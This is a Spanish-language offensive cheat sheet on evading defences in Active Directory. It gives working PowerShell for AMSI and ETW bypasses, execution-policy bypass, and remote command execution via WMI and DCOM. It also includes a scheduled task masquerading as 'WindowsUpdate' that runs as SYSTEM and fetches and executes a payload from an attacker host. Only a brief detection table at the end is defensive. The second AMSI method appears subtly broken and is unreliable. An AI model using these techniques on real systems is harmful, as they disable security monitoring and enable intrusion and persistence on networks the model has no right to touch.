# Evasión de Defensas en Active Directory

---

## AMSI Bypass (T1562.001)

AMSI (Antimalware Scan Interface) intercepta y analiza scripts PowerShell
antes de ejecutarlos. Se puede deshabilitar en memoria.

```powershell
# Método 1 — Patch de AMSI en memoria (clásico)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
    ?{$_} | % {$_.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}

# Método 2 — Mediante reflection
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext','NonPublic,Static')
$c=$b.GetValue($null)
[IntPtr]$d=[System.Runtime.InteropServices.Marshal]::Alloc(9)
[System.Runtime.InteropServices.Marshal]::Copy([Byte[]](0x31,0xC0,0xC3,0x90,0x90,0x90,0x90,0x90,0x00),$d,0,9)
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID" -Name "" -Value "" 2>$null
```

---

## PowerShell sin restricciones

```powershell
# Ver la política de ejecución actual
Get-ExecutionPolicy

# Bypass de la política de ejecución
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass

# Desde una sesión ya activa
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

---

## Living off the Land (LOtL)

Usar herramientas legítimas del sistema para evitar detección:

```powershell
# WMI para ejecución remota (sin PSExec)
Invoke-WmiMethod -ComputerName objetivo -Class Win32_Process -Name Create `
    -ArgumentList "cmd.exe /c whoami > C:\output.txt"

# DCOM para ejecución remota
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","objetivo"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")

# Scheduled Tasks para persistencia silenciosa
schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://atacante/payload.ps1')" /sc onlogon /ru System
```

---

## ETW (Event Tracing for Windows) Bypass

ETW registra eventos de PowerShell que pueden detectar el ataque:

```powershell
# Deshabilitar el proveedor de ETW de PowerShell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider') |
    %{ $_.GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0) }
```

---

## Detección de estas técnicas (Blue Team)

| Técnica | Indicador | Herramienta |
|---------|-----------|-------------|
| AMSI Bypass | Event 4104 con strings de bypass | SIEM + PowerShell logging |
| LOtL via WMI | Event 4688 con comandos WMI | Sysmon Event 1 |
| Scheduled Tasks | Event 4698 (tarea creada) | Sysmon |
| ETW Bypass | Ausencia de logs de PS | Script Block Logging |
